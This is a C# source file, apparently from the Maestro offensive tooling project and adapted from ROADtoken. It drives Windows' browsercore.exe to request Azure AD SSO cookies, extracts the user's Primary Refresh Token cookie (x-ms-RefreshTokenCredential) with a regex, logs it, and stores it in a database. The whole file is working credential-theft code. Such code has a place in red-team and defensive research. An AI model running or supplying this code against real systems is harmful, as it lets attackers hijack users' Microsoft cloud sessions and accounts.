//
// Dirk-jan Mollema (@_dirkjan) is the original author of this file. Thanks, Dirk-jan!
// https://github.com/dirkjanm/ROADtoken
// https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/
//

using System;
using System.Diagnostics;
using System.IO;
using System.Text.RegularExpressions;

namespace Maestro
{
    class ROADToken
    {
        public static PrtCookie GetPrtCookie(LiteDBHandler database, string nonce = null)
        {
            PrtCookie prtCookie = null;

            Logger.Info("Requesting PRT cookie" + (nonce != null ? " with nonce " : " ") + "for this user/device from LSA/CloudAP");

            string[] filelocs = {
                @"C:\Program Files\Windows Security\BrowserCore\browsercore.exe",
                @"C:\Windows\BrowserCore\browsercore.exe"
            };
            string targetFile = null;
            foreach (string file in filelocs)
            {

                if (File.Exists(file))
                {
                    targetFile = file;
                    break;
                }
            }
            if (targetFile == null)
            {
                Logger.Error("Could not find browsercore.exe in one of the predefined locations");
                return null;
            }
            using (Process myProcess = new Process())
            {
                myProcess.StartInfo.FileName = targetFile;
                myProcess.StartInfo.UseShellExecute = false;
                myProcess.StartInfo.RedirectStandardInput = true;
                myProcess.StartInfo.RedirectStandardOutput = true;
                string stuff;
                if (!string.IsNullOrEmpty(nonce))
                {
                    Logger.Info($"Using supplied nonce: {nonce}");
                    stuff = "{" +
                    "\"method\":\"GetCookies\"," +
                    $"\"uri\":\"https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce={nonce}\"," +
                    "\"sender\":\"https://login.microsoftonline.com\"" +
                    "}";
                }
                else
                {
                    Logger.Warning("No nonce supplied, refresh cookie will likely not work");
                    stuff = "{" +
                        "\"method\":\"GetCookies\"," +
                        $"\"uri\":\"https://login.microsoftonline.com/common/oauth2/authorize\"," +
                        "\"sender\":\"https://login.microsoftonline.com\"" +
                    "}";
                }

                myProcess.Start();

                StreamWriter myStreamWriter = myProcess.StandardInput;
                var myInt = stuff.Length;
                // Write length of stream
                byte[] bytes = BitConverter.GetBytes(myInt);
                myStreamWriter.BaseStream.Write(bytes, 0, 4);
                // Write data
                myStreamWriter.Write(stuff);

                // Close stream
                myStreamWriter.Close();
                // Read output
                
                string processOutput = null;
                while (!myProcess.StandardOutput.EndOfStream)
                {
                    string line = myProcess.StandardOutput.ReadLine();
                    processOutput += line;
                }
                // Wait for exit
                myProcess.WaitForExit();
                //Console.WriteLine(myProcess.ExitCode);

                Logger.Debug(processOutput);

                string pattern = "\"name\":\"x-ms-RefreshTokenCredential\",\"data\":\"(eyJh[^\"]+)";
                Match match = Regex.Match(processOutput, pattern);

                if (!match.Success)
                {
                    Logger.Error("Failed to obtain x-Ms-Refreshtokencredential" + (nonce != null ? " with nonce " : " "));
                    return null;
                }
                string xMsRefreshtokencredential = match.Groups[1].Value;
                Logger.Info($"Obtained x-Ms-Refreshtokencredential" + (nonce != null ? " with nonce" : " ") + $": {xMsRefreshtokencredential}");
                prtCookie = new PrtCookie(xMsRefreshtokencredential, database);
                return prtCookie;
            }
        }
    }
}